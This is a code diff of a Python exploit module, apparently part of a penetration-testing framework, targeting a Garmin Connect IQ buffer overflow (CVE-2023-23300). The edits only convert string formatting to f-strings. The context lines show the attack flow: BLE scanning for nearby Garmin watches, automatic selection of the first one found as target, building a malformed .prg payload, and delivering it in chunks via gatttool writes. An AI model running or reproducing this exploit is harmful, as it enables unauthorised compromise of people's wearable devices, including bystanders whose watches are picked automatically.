@@ -202,7 +202,7 @@ class Exploit(Exploit):
             sock.send(disable)
             sock.close()
         except (OSError, PermissionError) as exc:
-            print_error("BLE scan error: {}".format(exc))
+            print_error(f"BLE scan error: {exc}")
         return list(devices.values())
 
     def _parse_garmin_adv(self, pkt):
@@ -218,7 +218,7 @@ class Exploit(Exploit):
             return None
         try:
             addr_bytes = pkt[7:13] if len(pkt) > 13 else pkt[3:9]
-            bdaddr = ":".join("{:02X}".format(b) for b in reversed(addr_bytes))
+            bdaddr = ":".join(f"{b:02X}" for b in reversed(addr_bytes))
             name = ""
             is_garmin = False
 
@@ -263,13 +263,11 @@ class Exploit(Exploit):
             import subprocess
             mtu = 185
             total_chunks = (len(prg_data) + mtu - 1) // mtu
-            print_info("Payload size: {} bytes ({} BLE chunks)".format(
-                len(prg_data), total_chunks
-            ))
+            print_info(f"Payload size: {len(prg_data)} bytes ({total_chunks} BLE chunks)")
 
             for i in range(total_chunks):
                 chunk = prg_data[i * mtu:(i + 1) * mtu]
-                hex_data = " ".join("{:02x}".format(b) for b in chunk)
+                hex_data = " ".join(f"{b:02x}" for b in chunk)
                 cmd = [
                     "gatttool", "-b", bdaddr, "-i", self.adapter,
                     "--char-write-req", "--uuid", self._CIQ_TX_CHAR,
@@ -281,14 +279,12 @@ class Exploit(Exploit):
                     timeout=float(self.timeout),
                 )
                 if result.returncode != 0:
-                    print_error("Write failed at chunk {}/{}".format(
-                        i + 1, total_chunks
-                    ))
+                    print_error(f"Write failed at chunk {i + 1}/{total_chunks}")
                     return False
 
             return True
         except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
-            print_error("PRG delivery failed: {}".format(exc))
+            print_error(f"PRG delivery failed: {exc}")
             return False
 
     @mute
@@ -308,9 +304,7 @@ class Exploit(Exploit):
     def run(self):
         """Execute Garmin CIQ buffer overflow exploit."""
         print_status("Garmin Connect IQ BoF - CVE-2023-23300")
-        print_info("Payload: {} | Adapter: {}".format(
-            self.payload_type, self.adapter
-        ))
+        print_info(f"Payload: {self.payload_type} | Adapter: {self.adapter}")
 
         watches = self._scan_for_garmin()
         if watches:
@@ -323,24 +317,18 @@ class Exploit(Exploit):
 
         if not self.target_bdaddr and watches:
             self.target_bdaddr = watches[0]["bdaddr"]
-            print_info("Auto-selected target: {}".format(self.target_bdaddr))
+            print_info(f"Auto-selected target: {self.target_bdaddr}")
 
         if not self.target_bdaddr:
             print_error("No target specified or discovered")
             return
 
-        print_status("Building malformed .prg (payload: {})...".format(
-            self.payload_type
-        ))
+        print_status(f"Building malformed .prg (payload: {self.payload_type})...")
         prg = self._build_malformed_prg(self.payload_type)
         prg_hash = hashlib.sha256(prg).hexdigest()[:16]
-        print_info("PRG size: {} bytes | SHA256: {}...".format(
-            len(prg), prg_hash
-        ))
+        print_info(f"PRG size: {len(prg)} bytes | SHA256: {prg_hash}...")
 
-        print_status("Delivering .prg to {} via BLE...".format(
-            self.target_bdaddr
-        ))
+        print_status(f"Delivering .prg to {self.target_bdaddr} via BLE...")
         if self._deliver_prg(self.target_bdaddr, prg):
             print_success("Payload delivered successfully")
             print_info(
@@ -351,7 +339,7 @@ class Exploit(Exploit):
             print_error("Payload delivery failed")
             print_info(
                 "Ensure BLE pairing is active and the CIQ service "
-                "UUID {} is accessible.".format(self._CIQ_SVC_UUID)
+                f"UUID {self._CIQ_SVC_UUID} is accessible."
             )
 
         print_warning(
